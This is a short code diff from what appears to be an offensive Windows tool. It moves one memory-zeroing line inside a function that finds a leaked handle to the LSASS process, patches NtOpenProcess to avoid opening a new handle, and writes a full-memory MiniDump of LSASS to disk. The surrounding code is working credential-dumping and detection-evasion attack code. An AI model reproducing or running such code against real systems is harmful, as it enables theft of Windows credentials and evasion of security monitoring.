@@ -341,12 +341,12 @@ void MalSeclogonDumpLsassFromLeakedHandles(int lsassPid, wchar_t* dumpPath) {
 	int MiniDumpWithFullMemory = 0x00000002;
 	char oldCode[15];
 	int oldCodeSize;
+	RtlZeroMemory(oldCode, 15);
 	pMiniDumpWriteDump MiniDumpWriteDump = (pMiniDumpWriteDump)GetProcAddress(LoadLibrary(L"Dbghelp.dll"), "MiniDumpWriteDump");
 	// now we expect to have leaked handles in our current process. Even if the seclogon can duplicate 3 handles at a time it seems it duplicates each one 2 times, so total handles = 6
 	for (__int64 leakedHandle = 4; leakedHandle <= 4 * 6; leakedHandle = leakedHandle + 4) {
 		if (GetProcessId((HANDLE)leakedHandle) == lsassPid) {
 			HANDLE hFileDmp = CreateFile(dumpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-			RtlZeroMemory(oldCode, 15);
 			// we need to patch NtOpenProcess because MiniDumpWriteDump would open a new handle to lsass and we want to avoid that
 			ReplaceNtOpenProcess((HANDLE)leakedHandle, oldCode, &oldCodeSize);
 			BOOL result = MiniDumpWriteDump((HANDLE)leakedHandle, lsassPid, hFileDmp, MiniDumpWithFullMemory, NULL, NULL, NULL);
